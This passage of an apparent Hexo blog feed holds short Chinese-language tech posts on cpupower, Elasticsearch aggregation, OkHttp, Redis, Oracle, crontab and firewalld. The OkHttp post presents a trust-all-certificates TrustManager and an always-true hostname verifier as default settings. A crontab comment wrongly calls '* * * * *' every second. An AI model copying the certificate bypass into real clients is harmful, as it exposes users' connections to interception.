<h3 id="指令1-cpupower"><a href="#指令1-cpupower" class="headerlink" title="指令1 - cpupower"></a>指令1 - cpupower</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CPU 有支援哪一些指令，可以直接下cpupower</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># cpupower</span></span><br><span class="line">Usage:  cpupower [-c|--cpu cpulist ] &lt;<span class="built_in">command</span>&gt; [&lt;args&gt;]</span><br><span class="line">Supported commands are:</span><br><span class="line">        frequency-info</span><br><span class="line">        frequency-set</span><br><span class="line">        idle-info</span><br><span class="line">        idle-set</span><br><span class="line">        <span class="built_in">set</span></span><br><span class="line">        info</span><br><span class="line">        monitor</span><br><span class="line">        <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Not all commands can make use of the -c cpulist option.</span><br><span class="line"></span><br><span class="line">Use <span class="string">&#x27;cpupower help &lt;command&gt;&#x27;</span> <span class="keyword">for</span> getting <span class="built_in">help</span> <span class="keyword">for</span> above commands.</span><br></pre></td></tr></table></figure>

<h3 id="指令2-cpupower-idle-info"><a href="#指令2-cpupower-idle-info" class="headerlink" title="指令2 - cpupower idle-info"></a>指令2 - cpupower idle-info</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">查詢CPU有支援的 C-State</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># cpupower idle-info</span></span><br><span class="line">CPUidle driver: acpi_idle</span><br><span class="line">CPUidle governor: menu</span><br><span class="line">analyzing CPU 0:</span><br><span class="line"></span><br><span class="line">Number of idle states: 2</span><br><span class="line">Available idle states: POLL C1</span><br><span class="line">POLL:</span><br><span class="line">Flags/Description: CPUIDLE CORE POLL IDLE</span><br><span class="line">Latency: 0</span><br><span class="line">Usage: 0</span><br><span class="line">Duration: 0</span><br><span class="line">C1:</span><br><span class="line">Flags/Description: ACPI HLT</span><br><span class="line">Latency: 0</span><br><span class="line">Usage: 4183551158</span><br><span class="line">Duration: 11583728700572</span><br></pre></td></tr></table></figure>

<h3 id="指令3-cpupower-monitor-l"><a href="#指令3-cpupower-monitor-l" class="headerlink" title="指令3 - cpupower monitor -l"></a>指令3 - cpupower monitor -l</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">參數 monitor 可以檢視目前是哪一種 C-State</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># cpupower monitor -l</span></span><br><span class="line">Monitor <span class="string">&quot;Nehalem&quot;</span> (4 states) - Might overflow after 922000000 s</span><br><span class="line">C3      [C] -&gt; Processor Core C3</span><br><span class="line">C6      [C] -&gt; Processor Core C6</span><br><span class="line">PC3     [P] -&gt; Processor Package C3</span><br><span class="line">PC6     [P] -&gt; Processor Package C6</span><br><span class="line">Monitor <span class="string">&quot;Mperf&quot;</span> (3 states) - Might overflow after 922000000 s</span><br><span class="line">C0      [T] -&gt; Processor Core not idle</span><br><span class="line">Cx      [T] -&gt; Processor Core <span class="keyword">in</span> an idle state</span><br><span class="line">Freq    [T] -&gt; Average Frequency (including boost) <span class="keyword">in</span> MHz</span><br><span class="line">Monitor <span class="string">&quot;Idle_Stats&quot;</span> (2 states) - Might overflow after 4294967295 s</span><br><span class="line">POLL    [T] -&gt; CPUIDLE CORE POLL IDLE</span><br><span class="line">C1      [T] -&gt; ACPI HLT</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># cpupower monitor</span></span><br><span class="line">              | Nehalem                   || Mperf              || Idle_Stats</span><br><span class="line"> PKG|CORE| CPU| C3   | C6   | PC3  | PC6   || C0   | Cx   | Freq  || POLL | C1</span><br><span class="line">   0|   0|   0|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.54</span><br><span class="line">   0|   1|   1|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.48</span><br><span class="line">   0|   2|   2|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.54</span><br><span class="line">   0|   3|   3|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.36</span><br><span class="line">   1|   0|   4|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.65</span><br><span class="line">   1|   1|   5|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.99</span><br><span class="line">   1|   2|   6|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.63</span><br><span class="line">   1|   3|   7|  0.00|  0.00|  0.00|  0.00||  0.00| 100.0|9223372036854775808||  0.00| 98.74</span><br></pre></td></tr></table></figure>

<h3 id="指令4-cpupower-frequency-info"><a href="#指令4-cpupower-frequency-info" class="headerlink" title="指令4 - cpupower frequency-info"></a>指令4 - cpupower frequency-info</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">透過指令參數 frequency-info 可以得知目前這個 CPU 支援的工作頻率。</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># cpupower frequency-info</span></span><br><span class="line">analyzing CPU 0:</span><br><span class="line">  no or unknown cpufreq driver is active on this CPU</span><br><span class="line">  CPUs <span class="built_in">which</span> run at the same hardware frequency: Not Available</span><br><span class="line">  CPUs <span class="built_in">which</span> need to have their frequency coordinated by software: Not Available</span><br><span class="line">  maximum transition latency:  Cannot determine or is not supported.</span><br><span class="line">Not Available</span><br><span class="line">  available cpufreq governors: Not Available</span><br><span class="line">  Unable to determine current policy</span><br><span class="line">  current CPU frequency: Unable to call hardware</span><br><span class="line">  current CPU frequency:  Unable to call to kernel</span><br><span class="line">  boost state support:</span><br><span class="line">    Supported: <span class="built_in">yes</span></span><br><span class="line">    Active: <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CPU</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CPU</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve PuTTY Key Format Too New</title>
    <url>/posts/dcf9e840/</url>
    <content><![CDATA[<h3 id="How-To-Solve-PuTTY-Key-Format-Too-New"><a href="#How-To-Solve-PuTTY-Key-Format-Too-New" class="headerlink" title="How To Solve PuTTY Key Format Too New"></a>How To Solve PuTTY Key Format Too New</h3><span id="more"></span>
<p>這篇介紹How To Solve PuTTY Key Format Too New。</p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PuTTYgen -&gt; Key -&gt; Parameters <span class="keyword">for</span> saving key files -&gt; PPK file version -&gt; 2</span><br><span class="line"></span><br><span class="line">即可解決PuTTY Key Format Too New問題!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Puttygen</category>
      </categories>
      <tags>
        <tag>Puttygen</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Elasticsearch Aggregation RestHighLevelApi Implement</title>
    <url>/posts/d85e100f/</url>
    <content><![CDATA[<h3 id="Intro-Elasticsearch-Aggregation-RestHighLevelApi-Implement"><a href="#Intro-Elasticsearch-Aggregation-RestHighLevelApi-Implement" class="headerlink" title="Intro Elasticsearch Aggregation RestHighLevelApi Implement"></a>Intro Elasticsearch Aggregation RestHighLevelApi Implement</h3><span id="more"></span>
<p>這篇介紹Elasticsearch Aggregation RestHighLevelApi Implement。</p>
<h3 id="接續上一篇在ElasticSearch做Sum-Group-By作為case轉成RestHighLevelApi"><a href="#接續上一篇在ElasticSearch做Sum-Group-By作為case轉成RestHighLevelApi" class="headerlink" title="接續上一篇在ElasticSearch做Sum Group By作為case轉成RestHighLevelApi"></a>接續上一篇在ElasticSearch做Sum Group By作為case轉成RestHighLevelApi</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">KQL exmaple:</span><br><span class="line">GET &#123;index&#125;-*/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;size&quot;</span>: 0,</span><br><span class="line">	<span class="string">&quot;aggs&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;groupByField&quot;</span>: &#123;</span><br><span class="line">			<span class="string">&quot;terms&quot;</span>: &#123;</span><br><span class="line">			<span class="string">&quot;field&quot;</span>: <span class="string">&quot;employee&quot;</span></span><br><span class="line">		&#125;,</span><br><span class="line">	<span class="string">&quot;aggs&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;summarySalary&quot;</span>: &#123;</span><br><span class="line">			<span class="string">&quot;sum&quot;</span>: &#123;</span><br><span class="line">			<span class="string">&quot;field&quot;</span>: <span class="string">&quot;salary&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RestHighLevelApi-exmaple"><a href="#RestHighLevelApi-exmaple" class="headerlink" title="RestHighLevelApi exmaple:"></a>RestHighLevelApi exmaple:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">BoolQueryBuilder queryBuilder = QueryBuilders.boolQuery();</span><br><span class="line">sourceBuilder.size(ELKManager.MAX_REQUEST_SIZE);</span><br><span class="line">sourceBuilder.query(queryBuilder);</span><br><span class="line"></span><br><span class="line">String groupByName = <span class="string">&quot;groupByField&quot;</span>;</span><br><span class="line">String sumName = <span class="string">&quot;summarySalary&quot;</span>;</span><br><span class="line">TermsAggregationBuilder aggregationBuilder = AggregationBuilders.terms(groupByName).field(<span class="string">&quot;employee&quot;</span>)</span><br><span class="line">	.order(BucketOrder.aggregation(sumName, <span class="literal">false</span>));</span><br><span class="line">aggregationBuilder.subAggregation(AggregationBuilders.<span class="built_in">sum</span>(sumName).field(<span class="string">&quot;salary&quot;</span>));</span><br><span class="line">sourceBuilder.aggregation(aggregationBuilder);</span><br><span class="line">sourceBuilder.size(0);</span><br><span class="line">SearchResponse searchResponse = ELKManager.search(sourceBuilder, INDEX + <span class="string">&quot;*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (searchResponse.getHits().getTotalHits().value &gt; 0) &#123;</span><br><span class="line">	Terms aggregation = searchResponse.getAggregations().get(groupByName);</span><br><span class="line"></span><br><span class="line">	aggregation.getBuckets().stream().map(x -&gt; &#123;</span><br><span class="line">		String employee = x.getKeyAsString();</span><br><span class="line">		Sum <span class="built_in">sum</span> = x.getAggregations().get(sumName);</span><br><span class="line">		double summarySalary = sum.getValue();</span><br><span class="line">		System.out.println(<span class="string">&quot;employee:&quot;</span> + employee + <span class="string">&quot; ; summarySalary:&quot;</span> + summarySalary);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>RestHighLevelApi</tag>
        <tag>Aggregation</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Hexo deploy Error Spawn Failed</title>
    <url>/posts/9854d2c6/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-Hexo-deploy-Error-Spawn-Failed"><a href="#Intro-How-To-Solve-Hexo-deploy-Error-Spawn-Failed" class="headerlink" title="Intro How To Solve Hexo deploy Error Spawn Failed"></a>Intro How To Solve Hexo deploy Error Spawn Failed</h3><span id="more"></span>
<p>這篇介紹How To Solve Hexo deploy Error Spawn Failed.</p>
<h3 id="hexo-d-amp-git-push-出現錯誤"><a href="#hexo-d-amp-git-push-出現錯誤" class="headerlink" title="hexo d &amp; git push 出現錯誤"></a>hexo d &amp; git push 出現錯誤</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">remote: Permission to xxx/xxx.github.io.git denied to aaa.</span><br><span class="line">fatal: unable to access <span class="string">&#x27;https://github.com/xxx/xxx.github.io.git/&#x27;</span>: </span><br><span class="line">The requested URL returned error: 403</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Git SourceTree https://github.com/xxx/xxx.github.io.git/ </span><br><span class="line">改成 https://bbb@github.com/xxx/xxx.github.io.git/</span><br><span class="line"></span><br><span class="line">_config.yml</span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: https://bbb@github.com/xxx/xxx.github.io.git/ -&gt; 改成跟上面一樣</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro OKHttp defaults settings</title>
    <url>/posts/9c28ffc6/</url>
    <content><![CDATA[<h3 id="Intro-OKHttp-defaults-settings"><a href="#Intro-OKHttp-defaults-settings" class="headerlink" title="Intro OKHttp defaults settings"></a>Intro OKHttp defaults settings</h3><span id="more"></span>
<p>這篇介紹OKHttp defaults settings。</p>
<h3 id="初始預設用法"><a href="#初始預設用法" class="headerlink" title="初始預設用法"></a>初始預設用法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private <span class="function"><span class="title">OKHttpClient</span></span>() &#123;</span><br><span class="line">	try &#123;</span><br><span class="line"></span><br><span class="line">		OkHttpClient.Builder client = new OkHttpClient.Builder();</span><br><span class="line"></span><br><span class="line">		// 對同一個網站最多保持多少的 keep-alive connection</span><br><span class="line">		client.connectionPool(new ConnectionPool(10, 6, TimeUnit.SECONDS));</span><br><span class="line">		client.connectTimeout(CONNECTION_TIMEOUT, TimeUnit.MILLISECONDS);</span><br><span class="line">		client.readTimeout(SOCKET_HOLD_TIMEOUT, TimeUnit.MILLISECONDS);</span><br><span class="line">		client.writeTimeout(SOCKET_HOLD_TIMEOUT, TimeUnit.MILLISECONDS);</span><br><span class="line">		</span><br><span class="line">		//retry機制由程式精準控制</span><br><span class="line">		client.retryOnConnectionFailure(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">		// 設定thread pool</span><br><span class="line">		Dispatcher dispatcher = new Dispatcher(service);</span><br><span class="line"></span><br><span class="line">		// 可以同時發起的連線數量</span><br><span class="line">		dispatcher.setMaxRequests(MAX_TOTAL);</span><br><span class="line"></span><br><span class="line">		// 對同一站點最大可以發起的連線數</span><br><span class="line">		dispatcher.setMaxRequestsPerHost(MAX_PER_ROUTE);</span><br><span class="line"></span><br><span class="line">		client.dispatcher(dispatcher);</span><br><span class="line"></span><br><span class="line">		// 接收所有SSL憑證，並省略驗證</span><br><span class="line">		client.sslSocketFactory(sslSocketFactory(), (X509TrustManager) trustAllCerts[0]);</span><br><span class="line">		client.hostnameVerifier(hostnameVerifier);</span><br><span class="line"></span><br><span class="line">		this.client = client.build();</span><br><span class="line"></span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		log.error(e.getMessage(), e);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="接收所有SSL憑證，並省略驗證"><a href="#接收所有SSL憑證，並省略驗證" class="headerlink" title="接收所有SSL憑證，並省略驗證"></a>接收所有SSL憑證，並省略驗證</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">// 預設忽略證書的驗證</span><br><span class="line">private TrustManager[] trustAllCerts = new TrustManager[]&#123;new <span class="function"><span class="title">X509TrustManager</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void checkClientTrusted(X509Certificate[] chain, String authType) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void checkServerTrusted(X509Certificate[] chain, String authType) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public X509Certificate[] <span class="function"><span class="title">getAcceptedIssuers</span></span>() &#123;</span><br><span class="line">		<span class="built_in">return</span> new X509Certificate[]&#123;&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;&#125;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 配置一個HostnameVerifier來忽略host驗證</span><br><span class="line"> * 否則可能會出現請求證書和伺服器的證書不一致的錯誤</span><br><span class="line"> *</span><br><span class="line"> * @<span class="built_in">return</span></span><br><span class="line"> */</span><br><span class="line">private HostnameVerifier hostnameVerifier = new <span class="function"><span class="title">HostnameVerifier</span></span>() &#123;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public boolean verify(String hostname, SSLSession session) &#123;</span><br><span class="line">		<span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>SSL</tag>
        <tag>Cookie</tag>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Redis String Max Size</title>
    <url>/posts/875dfe8d/</url>
    <content><![CDATA[<h3 id="Intro-Redis-String-Max-Size"><a href="#Intro-Redis-String-Max-Size" class="headerlink" title="Intro Redis String Max Size"></a>Intro Redis String Max Size</h3><span id="more"></span>
<p>這篇介紹Redis String Max Size.</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在使用Redis的資料結構當cache時，第一個想到的問題是</span><br><span class="line">巨量資料可不可以塞進去Redis RMap的value。</span><br><span class="line"></span><br><span class="line">查看Redis官方文件:</span><br><span class="line">A String value can be at max 512 Megabytes <span class="keyword">in</span> length.</span><br><span class="line"></span><br><span class="line">Redis RMap<span class="string">&#x27;s Key and Value can be at max 512 Megabytes in length.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Every hash can store up to 2^32 - 1 field-value pairs (more than 4 billion).</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>String</tag>
        <tag>Key</tag>
        <tag>Value</tag>
      </tags>
  </entry>
  <entry>
    <title>java util NoSuch Element Exception No value present</title>
    <url>/posts/6112693c/</url>
    <content><![CDATA[<h2 id="java-util-NoSuchElementException-No-value-present"><a href="#java-util-NoSuchElementException-No-value-present" class="headerlink" title="java.util.NoSuchElementException:No value present"></a>java.util.NoSuchElementException:No value present</h2><span id="more"></span>
<p>List<T>執行stream().findFirst().get()時會出現<br>java.util.NoSuchElementException:No value present錯誤訊息。<br>以下提供程式Example及相關解決方法!</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h2><p>List<String> list &#x3D; new List<String>();<br>list.add(“A”);<br>list.add(“B”);<br>list.add(“C”);<br>list.stream().filter(obj -&gt; obj &#x3D;&#x3D; “D”).findFirst().get();<br>&#x2F;&#x2F;上一句語法會造成java.util.NoSuchElementException:No value present錯誤</p>
<h2 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法:"></a>解決方法:</h2><p>Optional<String> result &#x3D; list.stream().filter(obj -&gt; obj &#x3D;&#x3D; “D”).findFirst();<br>if (result.isPresent()) {<br>    String a &#x3D; result.get();<br>}</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>stream</tag>
      </tags>
  </entry>
  <entry>
    <title>java Sql SQLFeature Not Supported Exception Unsupported Holdability Value</title>
    <url>/posts/8e83914/</url>
    <content><![CDATA[<h3 id="java-Sql-SQLFeature-Not-Supported-Exception-Unsupported-Holdability-Value"><a href="#java-Sql-SQLFeature-Not-Supported-Exception-Unsupported-Holdability-Value" class="headerlink" title="java Sql SQLFeature Not Supported Exception Unsupported Holdability Value"></a>java Sql SQLFeature Not Supported Exception Unsupported Holdability Value</h3><span id="more"></span>
<p>這篇介紹java Sql SQLFeature Not Supported Exception Unsupported Holdability Value.</p>
<h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Oracle從11.2.0.1升級至Oracle RAC 19.3.0.0</span><br><span class="line">在使用</span><br><span class="line">try (PreparedStatement ps = conn.prepareStatement(sql, ResultSet.TYPE_FORWARD_ONLY,</span><br><span class="line">	ResultSet.CONCUR_UPDATABLE, ResultSet.CLOSE_CURSORS_AT_COMMIT)) &#123;</span><br><span class="line">&#125;</span><br><span class="line">語法時會出現</span><br><span class="line">java.sql.SQLFeatureNotSupportedException: Unsupported holdability value</span><br></pre></td></tr></table></figure>

<h3 id="原因-amp-解決方法"><a href="#原因-amp-解決方法" class="headerlink" title="原因&amp;解決方法"></a>原因&amp;解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Oracle 11g 的文件，已說明只Spport HOLD_CURSORS_OVER_COMMIT參數。</span><br><span class="line">將ResultSet.CLOSE_CURSORS_AT_COMMIT參數改成ResultSet.HOLD_CURSORS_OVER_COMMIT。</span><br><span class="line">並確保connection和ResultSet使用完皆有回收。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
        <tag>RAC</tag>
        <tag>Oracle19c</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Quartz vs. Linux-Crontab</title>
    <url>/posts/934d4e6d/</url>
    <content><![CDATA[<h3 id="Java-Quartz-vs-Linux-Crontab"><a href="#Java-Quartz-vs-Linux-Crontab" class="headerlink" title="Java-Quartz vs. Linux-Crontab"></a>Java-Quartz vs. Linux-Crontab</h3><span id="more"></span>
<p>這篇介紹Java-Quartz和Linux-Crontab兩者不同以及使用時機。</p>
<h3 id="Java-Quartz"><a href="#Java-Quartz" class="headerlink" title="Java-Quartz"></a>Java-Quartz</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//Excample code:</span><br><span class="line">package com.nv.quartzjob;</span><br><span class="line"></span><br><span class="line">import org.quartz.DisallowConcurrentExecution;</span><br><span class="line">import org.quartz.Job;</span><br><span class="line">import org.quartz.JobExecutionContext;</span><br><span class="line">import org.quartz.JobExecutionException;</span><br><span class="line"></span><br><span class="line">@DisallowConcurrentExecution</span><br><span class="line">public class UpdateJob implements Job &#123;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public void execute(final JobExecutionContext ctx) throws JobExecutionException &#123;</span><br><span class="line">		//do something</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">Java-Quartz若加入@DisallowConcurrentExecution annotation設定</span><br><span class="line">執行Job時同時只會有一個Job存在，下一個會等待上一個完成才執行。</span><br></pre></td></tr></table></figure>

<h3 id="Linux-Crontab"><a href="#Linux-Crontab" class="headerlink" title="Linux-Crontab"></a>Linux-Crontab</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">//每秒去清<span class="built_in">log</span></span><br><span class="line">* * * * * sh /home/clearLog.sh</span><br><span class="line">在Linux的crontab是屬於fire at time，當時間一到就馬上執行，不會去判斷上一個crontab還</span><br><span class="line">在不在，屬於ConcurrentExecution。</span><br></pre></td></tr></table></figure>

<h3 id="兩者比較-amp-使用時機"><a href="#兩者比較-amp-使用時機" class="headerlink" title="兩者比較&amp;使用時機"></a>兩者比較&amp;使用時機</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Java中，可以依照需求，若方法是依照功能區分，該Job可命名為功能Job。</span><br><span class="line">若需依照periodTime，有多個功能要加入period10minsJob內，則可以使用MultiThread</span><br><span class="line">做平行處理，達到一樣的效果。</span><br><span class="line">---</span><br><span class="line">在Linux-Crontab</span><br><span class="line">則需要注意平行處理所造成非預期的結果，例如每秒校正對時，在網路延遲時有可能對時</span><br><span class="line">會每秒發生錯誤對時，造成系統時間異常。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Schedule</category>
      </categories>
      <tags>
        <tag>Quartz</tag>
        <tag>Crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>linux grep Accepted or Failed Password</title>
    <url>/posts/491a8019/</url>
    <content><![CDATA[<h3 id="linux-grep-Accepted-or-Failed-Password"><a href="#linux-grep-Accepted-or-Failed-Password" class="headerlink" title="linux grep Accepted or Failed Password"></a>linux grep Accepted or Failed Password</h3><span id="more"></span>
<p>這篇介紹在Linux上grep Accepted or Failed Password。</p>
<h3 id="Accepted"><a href="#Accepted" class="headerlink" title="Accepted"></a>Accepted</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted&quot;</span> /var/log/secure</span><br></pre></td></tr></table></figure>

<h3 id="Failed-Password"><a href="#Failed-Password" class="headerlink" title="Failed Password"></a>Failed Password</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Login</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Linux firewalld</title>
    <url>/posts/e197c48f/</url>
    <content><![CDATA[<h3 id="Intro-Linux-firewalld"><a href="#Intro-Linux-firewalld" class="headerlink" title="Intro Linux firewalld"></a>Intro Linux firewalld</h3><span id="more"></span>
<p>在舊版的 CentOS Linux 中，防火牆都是以傳統的iptables來設定，而從 CentOS 7 開始，則改用 firewalld 來管理防火牆。</p>
<p>傳統的 iptables 在每次修改防火牆時都要清除舊規則，重新套用一次新規則，使用上不是很方便，而新的 firewalld 以區域（zone）的方式管理規則，<br>並使用動態的方式執行，修改規則後可立即生效，也不需要重新啟動系統的服務（service 或 daemon），<br>所以後來的 RHEL、CentOS 與 Fedora 都改用 firewalld 了。</p>
<p>iptables 與 firewalld 兩個防火牆管理系統只能選用其中一種，不可以同時開啟，否則會有問題。</p>
<p>安裝 firewalld</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">安裝 firewalld 之前，請先確認 iptables 是否有被啟用，若系統上原本就有運行 iptables 的防火牆，</span><br><span class="line">一定要先將其關閉後，才能啟用 firewalld，否則會有問題：</span><br><span class="line"></span><br><span class="line"><span class="comment"># 檢查 iptables 服務是否正在運行</span></span><br><span class="line">systemctl status iptables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止正在執行的 iptables 服務</span></span><br><span class="line">systemctl stop iptables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將 iptables 服務永久關閉</span></span><br><span class="line">systemctl mask iptables</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running to dead</span></span><br><span class="line">systemctl stop iptables</span><br></pre></td></tr></table></figure>

<p>firewalld 在 RHEL&#x2F;CentOS 7 與 Fedora 21 之中應該是預設就會安裝好的，若您的系統上沒有安裝，可用 yum 安裝：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo yum install firewalld</span><br></pre></td></tr></table></figure>

<p>當 firewalld 安裝好之後，檢查 firewalld 服務是否有啟動：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 檢查 firewalld 服務狀態</span></span><br><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure>

<p>若 firewalld 沒有啟動，則手動啟動它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 啟動 firewalld 服務</span></span><br><span class="line">systemctl start firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止 firewalld 服務</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新啟動 firewalld 服務</span></span><br><span class="line">service firewalld restart</span><br></pre></td></tr></table></figure>

<p>若要設定讓 firewalld 在開機時自動啟動，可執行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 設定開機自動啟動 firewalld 服務</span></span><br><span class="line">systemctl <span class="built_in">enable</span> firewalld</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>firewalld</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Linux overcommit_memory For Redis</title>
    <url>/posts/b6fa5d15/</url>
    <content><![CDATA[<h3 id="Intro-Linux-overcommit-memory-For-Redis"><a href="#Intro-Linux-overcommit-memory-For-Redis" class="headerlink" title="Intro Linux overcommit_memory For Redis"></a>Intro Linux overcommit_memory For Redis</h3><span id="more"></span>
<p>這篇介紹Linux overcommit_memory For Redis。</p>
<h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Redis Server啟動時會出現</span><br><span class="line"></span><br><span class="line">WARNING overcommit_memory is <span class="built_in">set</span> to 0! Background save may fail under low memory condition.</span><br><span class="line">To fix this issue add <span class="string">&#x27;vm.overcommit_memory = 1&#x27;</span> to /etc/sysctl.conf and <span class="keyword">then</span> reboot or run</span><br><span class="line">the <span class="built_in">command</span> <span class="string">&#x27;sysctl vm.overcommit_memory=1&#x27;</span> <span class="keyword">for</span> this to take effect.</span><br></pre></td></tr></table></figure>

<h3 id="Modify-setting"><a href="#Modify-setting" class="headerlink" title="Modify setting"></a>Modify setting</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">修改 /proc/sys/vm/overcommit_memory 0 to 1</span><br></pre></td></tr></table></figure>

